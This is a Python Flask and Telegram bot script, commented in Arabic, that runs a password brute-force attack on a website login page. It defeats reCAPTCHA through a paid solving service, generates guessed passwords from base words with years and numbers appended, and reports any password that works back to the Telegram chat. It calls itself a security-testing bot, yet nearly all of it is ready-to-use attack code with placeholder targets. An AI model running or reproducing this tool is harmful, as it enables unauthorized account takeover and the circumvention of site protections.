from flask import Flask
import threading
import telebot
import requests
import random
import time
from datetime import datetime
from fake_useragent import UserAgent
import re

app = Flask(__name__)

# كلاس الباسورد جينيريتر (نسخه كاملة)
class AdvancedPasswordGenerator:
    def __init__(self):
        self.generated_count = 0
        self.ua = UserAgent()
        self.session = requests.Session()
        self.captcha_api_key = "YOUR_REAL_2CAPTCHA_API_KEY"  # غير هنا!
        
    def solve_captcha_with_api(self, target_url):
        try:
            if self.captcha_api_key == "YOUR_REAL_2CAPTCHA_API_KEY":
                return None
            
            data = {
                'key': self.captcha_api_key,
                'method': 'userrecaptcha',
                'googlekey': '6Le-wvkSAAAAAPBMRTvw0Q4Muexq9bi0DJwx_mJ-',
                'pageurl': target_url,
                'json': 1
            }
            
            response = requests.post('http://2captcha.com/in.php', data=data)
            result = response.json()
            
            if result.get('status') == 1:
                captcha_id = result.get('request')
                for i in range(6):
                    time.sleep(5)
                    check_url = f'http://2captcha.com/res.php?key={self.captcha_api_key}&action=get&id={captcha_id}&json=1'
                    result = requests.get(check_url).json()
                    if result.get('status') == 1:
                        return result.get('request')
                return None
            return None
        except:
            return None

    def generate_advanced_passwords(self, base_words):
        all_passwords = set()
        years = [str(year) for year in range(2010, 2025)]
        for word in base_words:
            for year in years:
                all_passwords.add(word + year)
            for i in range(100):
                all_passwords.add(word + str(i))
        self.generated_count = len(all_passwords)
        return list(all_passwords)
    
    def detect_success(self, response, password):
        success_indicators = ["dashboard", "welcome", "success", "logged in"]
        response_text = response.text.lower()
        for indicator in success_indicators:
            if indicator in response_text:
                return True
        return False

# البوت
BOT_TOKEN = "YOUR_BOT_TOKEN"  # غير هنا!
bot = telebot.TeleBot(BOT_TOKEN)

# تخزين الحالة
attack_status = {}

@app.route('/')
def home():
    return "🤖 بوت اختبار الأمان شغال! /start"

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "🚀 أهلاً بك في بوت اختبار الأمان!\n\n"
                         "استخدم /attack لبدء الهجوم\n"
                         "استخدم /status لمتابعة الحالة")

@bot.message_handler(commands=['attack'])
def start_attack(message):
    chat_id = message.chat.id
    bot.reply_to(message, "🔧 جاري بدء الهجوم السريع...")
    
    thread = threading.Thread(target=run_attack, args=(chat_id,))
    thread.start()
    
    attack_status[chat_id] = "جاري التشغيل"

@bot.message_handler(commands=['status'])
def check_status(message):
    chat_id = message.chat.id
    status = attack_status.get(chat_id, "لا يوجد هجوم نشط")
    bot.reply_to(message, f"📊 حالة الهجوم: {status}")

def run_attack(chat_id):
    try:
        attack_status[chat_id] = "جاري توليد كلمات المرور"
        
        generator = AdvancedPasswordGenerator()
        base_keywords = ["admin", "test"]  # غير هنا!
        target_url = "https://example.com/login"  # غير هنا!
        username = "admin"  # غير هنا!
        
        attack_status[chat_id] = "جاري حل الكابتشا"
        captcha_solution = generator.solve_captcha_with_api(target_url)
        
        if not captcha_solution:
            bot.send_message(chat_id, "❌ فشل في حل الكابتشا")
            return
        
        passwords = generator.generate_advanced_passwords(base_keywords)
        attack_status[chat_id] = f"جاري اختبار {len(passwords)} كلمة مرور"
        
        for i, password in enumerate(passwords[:50], 1):
            try:
                if i % 10 == 0:
                    attack_status[chat_id] = f"تم تجربة {i} كلمة مرور"
                    
                payload = {
                    "username": username,
                    "password": password,
                    "g-recaptcha-response": captcha_solution
                }
                
                response = generator.session.post(target_url, data=payload, timeout=5)
                
                if generator.detect_success(response, password):
                    attack_status[chat_id] = "تم العثور على كلمة المرور!"
                    bot.send_message(chat_id, f"🎉 تم العثور على كلمة المرور!\n\n👤 اليوزر: {username}\n🔑 الباسورد: {password}")
                    break
                    
            except:
                continue
        
        attack_status[chat_id] = "تم الانتهاء"
        bot.send_message(chat_id, "✅ تم الانتهاء من الهجوم")
        
    except Exception as e:
        bot.send_message(chat_id, f"❌ خطأ: {str(e)}")

def run_bot():
    print("🤖 البوت اشتغل على Render...")
    bot.polling(none_stop=True)

if __name__ == "__main__":
    thread = threading.Thread(target=run_bot)
    thread.start()
    app.run(host='0.0.0.0', port=10000)